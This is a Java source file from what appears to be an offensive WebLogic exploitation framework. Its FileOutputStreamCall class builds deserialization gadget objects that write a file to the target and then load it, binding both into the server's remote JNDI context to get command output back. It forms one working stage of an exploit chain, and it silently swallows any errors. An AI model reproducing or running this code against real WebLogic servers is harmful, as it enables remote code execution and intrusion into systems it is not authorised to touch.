/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.r4v3zn.weblogic.framework.call;

import com.r4v3zn.weblogic.framework.enmus.CallEnum;
import com.r4v3zn.weblogic.framework.entity.ContextPojo;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import com.r4v3zn.weblogic.framework.vuls.VulTest;
import lombok.extern.log4j.Log4j2;

/**
 * Title: WriteCall
 * Desc: FileOutputStream 回显
 * Date:2020/7/14 00:17
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
@Log4j2
public class FileOutputStreamCall implements Call {


    /**
     * 执行回显方案前置
     *
     * @param param 利用参数
     * @param vulTest 漏洞对象
     * @param gadgetClazz
     * @param contextPojo 链接对象
     * @return
     */
    @Override
    public ContextPojo executeCall(GadgetParam param, VulTest vulTest, Class<? extends ObjectGadget<?>> gadgetClazz, ContextPojo contextPojo) {
        try {
            ObjectGadget gadget = gadgetClazz.newInstance();
            Object object = gadget.getWriteFileObject(param);
            contextPojo.getContext().rebind("write_8kgumc08erbo7osp", object);
        } catch (Exception e) {
        }
        try{
            ObjectGadget gadget = gadgetClazz.newInstance();
            Object object = gadget.getLoadFileObject(param);
            contextPojo.getContext().rebind("load_8kgumc08erbo7osp", object);
        }catch (Exception e){
        }
        return contextPojo;
    }
}
